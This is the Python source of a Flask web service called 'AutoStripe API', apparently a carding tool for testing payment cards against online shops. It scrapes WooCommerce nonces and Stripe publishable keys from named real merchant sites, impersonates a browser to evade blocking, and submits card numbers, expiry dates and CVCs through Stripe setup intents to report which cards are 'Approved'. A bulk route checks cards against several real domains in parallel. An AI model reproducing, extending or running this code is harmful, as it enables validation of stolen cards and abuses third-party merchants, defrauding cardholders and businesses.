from flask import Flask, jsonify, render_template_string, request
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from curl_cffi import requests as curlr
import uuid
import time
import re
import random
import os
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
# Set workers to 5 to avoid overloading Render's free tier CPU
executor = ThreadPoolExecutor(max_workers=5)

@app.route('/')
def home():
    # Your original UI dashboard
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>AutoStripe API - Live Dashboard</title>
        <style>
            body { font-family: 'Poppins', sans-serif; background: #1a1a2e; color: white; text-align: center; padding-top: 50px; }
            .container { background: rgba(255,255,255,0.1); padding: 30px; border-radius: 15px; display: inline-block; }
            .status { color: #4caf50; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>AutoStripe API</h1>
            <p>Status: <span class="status">ONLINE</span></p>
            <p>Endpoint: <code>/process</code> | <code>/bulk</code></p>
        </div>
    </body>
    </html>
    """)

def extract_nonce(html):
    """Bypasses security by finding the correct WooCommerce/Stripe tokens."""
    soup = BeautifulSoup(html, 'html.parser')
    # Check common hidden inputs
    targets = ['_ajax_nonce', 'wc-stripe-confirm-payment-nonce', 'stripe_confirm_payment_nonce', 'woocommerce-register-nonce']
    for t in targets:
        tag = soup.find('input', {'name': t})
        if tag and tag.get('value'): return tag['value']
    
    # Check script tags for JSON-embedded nonces
    match = re.search(r'["\']nonce["\']\s*:\s*["\']([a-f0-9]{10,})["\']', html)
    return match.group(1) if match else None

def get_stripe_key(html):
    """Scrapes the publishable key from the site's source code."""
    match = re.search(r'pk_live_[a-zA-Z0-9_]+', html)
    return match.group(0) if match else "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"

def process_card_enhanced(domain, ccx):
    """Core logic to check a card against a specific domain."""
    try:
        session = curlr.Session(impersonate="chrome110")
        card_num, mm, yy, cvc = ccx.strip().split("|")
        if len(yy) == 4: yy = yy[2:]

        # Visit landing page to set cookies and trigger security tokens
        res = session.get(f"https://{domain}/my-account/add-payment-method/", timeout=20)
        if res.status_code == 403: return {"Domain": domain, "Response": "Cloudflare/IP Block", "Status": "Declined"}

        nonce = extract_nonce(res.text)
        stripe_key = get_stripe_key(res.text)
        if not nonce: return {"Domain": domain, "Response": "Nonce Missing", "Status": "Declined"}

        # Step 1: Create Stripe Payment Method
        pm_payload = {
            'type': 'card', 'card[number]': card_num, 'card[cvc]': cvc,
            'card[exp_year]': yy, 'card[exp_month]': mm, 'key': stripe_key
        }
        pm_res = session.post("https://api.stripe.com/v1/payment_methods", data=pm_payload)
        pm_id = pm_res.json().get('id')
        if not pm_id: return {"Domain": domain, "Response": pm_res.json().get('error', {}).get('message'), "Status": "Declined"}

        # Step 2: Confirm with target Gateway
        confirm_data = {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id, '_ajax_nonce': nonce}
        final_res = session.post(f"https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=confirm_data)
        
        if "succeeded" in final_res.text:
            return {"Domain": domain, "Response": "Approved", "Status": "Approved"}
        return {"Domain": domain, "Response": "Declined by Gateway", "Status": "Declined"}

    except Exception as e:
        return {"Domain": domain, "Response": f"Error: {str(e)}", "Status": "Error"}

@app.route('/process')
def process_request():
    if request.args.get('key') != "inferno": return jsonify({"error": "Unauthorized"}), 401
    site = request.args.get('site').replace("https://", "").replace("http://", "").split('/')[0]
    return jsonify(process_card_enhanced(site, request.args.get('cc')))

@app.route('/bulk')
def bulk_process_request():
    """Newly added route to fix 404 errors during bulk checking."""
    if request.args.get('key') != "inferno": return jsonify({"error": "Unauthorized"}), 401
    cc = request.args.get('cc')
    
    test_domains = ["pianopronto.com", "metallica.com", "typeonegative.net"]
    results = []
    
    # Use multi-threading to speed up the checks
    with ThreadPoolExecutor(max_workers=3) as pool:
        futures = [pool.submit(process_card_enhanced, domain, cc) for domain in test_domains]
        for future in as_completed(futures):
            results.append(future.result())
            
    return jsonify({"results": results})

@app.route('/health')
def health(): return jsonify({"status": "healthy"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
